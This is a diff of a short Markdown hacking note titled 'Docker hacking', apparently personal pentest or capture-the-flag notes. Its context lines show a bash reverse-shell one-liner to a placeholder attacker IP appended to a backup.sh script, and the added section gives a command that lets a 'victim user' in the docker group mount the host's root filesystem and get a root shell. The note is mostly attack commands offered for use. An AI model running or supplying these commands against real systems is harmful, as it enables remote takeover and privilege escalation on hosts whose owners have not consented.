@@ -11,3 +11,16 @@ title: Docker hacking 🐳
 ```shell
 echo "bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1" >> backup.sh
 ```
+
+## Being part of the docker group
+
+- If we find out that our victim user belongs to the docker group, we can do the following (based on [GTFObins](https://gtfobins.github.io/gtfobins/docker/)):
+
+```shell
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+![](Pasted%20image%2020240417222812.png)
+
+![](Pasted%20image%2020240417222753.png)
+
